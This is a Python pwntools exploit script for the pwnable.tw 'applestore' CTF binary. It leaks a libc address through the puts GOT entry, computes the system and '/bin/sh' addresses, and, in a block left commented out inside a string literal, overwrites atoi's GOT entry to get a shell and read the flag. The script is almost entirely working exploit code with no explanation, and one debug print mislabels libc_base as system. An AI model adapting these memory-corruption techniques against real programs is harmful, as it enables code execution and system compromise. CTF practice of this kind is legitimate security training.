
#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("applestore_patched")
libc = elf.libc

local = True 
if local:
    p = process("./applestore_patched")
    gdb.attach(p,'''
    b*0x08048a44
    c
    ''')
else:
    p = remote('chall.pwnable.tw', 10104)
'''
b*0x08048a44
    c
    b*0x08048a44
    c
    b*0x08048a03
    c
    b*handler+64'''
elf = context.binary = ELF('./applestore_patched', checksec=False)

def add(number):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b"Device Number>", str(number))
    print("[+]Add: Done")

def delete(data):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b"Item Number>", data)
    print("[+]Delete: Done")

def list_card():
    p.sendlineafter(b">", b"4")
    p.sendlineafter(b"Let me check your cart. ok? (y/n) >", b"y")
    print("[+]List: Done")

def checkout():
    p.sendlineafter(b">", b"5")
    p.sendlineafter(b"Let me check your cart. ok? (y/n) >", b"y")
    print("[+]Check: Done")

for i in range(6):
		add(1)
for i in range(20):
		add(2)
checkout()

delete(b"27" + p32(elf.got['puts']))

p.recvuntil(b"Remove 27:")
libc_base = int.from_bytes(p.recv(4),"little") - 0x5f140
libc_system = libc_base + 0x3a940
binsh = libc_base + 0x158e8b
print("\n[+]Libc_base:    ", hex(libc_base))
print("[+]Libc_system:  ", hex(libc_base))
print("[+]Libc_binsh:   ", hex(binsh))
'''

delete(b"27" + p32(libc_base+0x1b1dbc))
p.recvuntil(b"Remove 27:")
ebp_addr = int.from_bytes(p.recv(4),"little") - 260
print("[+]Ebp_addr:     ", hex(ebp_addr))

atoi_got = 0x804b040
print("[+]Atoi+0x22:     ", hex(atoi_got+0x22))
print("[+]Ebp_addr-8:     ", hex(ebp_addr-8))
delete(b"27" + p32(0) + p32(0) + p32(atoi_got+0x22) + p32(ebp_addr-8) ) # write atoi_got+0x22 to ebp
p.sendline(p32(libc_system) + b";sh;")
if local:
    p.sendline(b"id")
else:
    sleep(2)
    p.sendline(b"cd home/applestore")
    sleep(1)
    p.sendline(b"cat flag")
'''
p.interactive()